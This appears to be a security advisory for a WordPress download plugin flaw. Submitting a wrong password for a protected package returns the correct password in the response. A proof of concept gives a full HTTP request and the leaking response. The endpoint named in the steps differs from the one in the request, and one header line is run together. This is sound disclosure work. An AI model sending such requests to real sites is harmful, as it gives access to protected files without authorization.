# Download Manager  < 3.2.81 - Leakage of passwords for any password-protected package

### Description

The Download Manager WordPress plugin, up to version 3.2.81, is vulnerable to an issue where an attacker attempting to download any password-protected package file can, upon entering an incorrect password, receive the correct password in the response. This allows the attacker to download any protected file without the appropriate credentials.

### Proof of Concept

```
- Create a password protected package containing one or more files.
- Navigate to the download page of the package (e.g. `/download/packagetest`)
- Inspect the "Download" button beside one of the packaged files.
- Send a POST request to `/wp-json/wpdm/validate-filepass`:

POST /index.php/wp-json/wpdm/validate-password HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 85

__wpdm_ID=22&dataType=json&execute=wpdm_getlink&action=wpdm_ajax_call&password=123322

- The response will look like the following:

{"success":false,"message":"Wrong Password! &nbsp; <span><i class='fas fa-redo'><\/i> Try Again <\/span>","op":"123123"}

"op":"123123" is the correct password.

- When we enter an incorrect password, it returns a correct password..
```
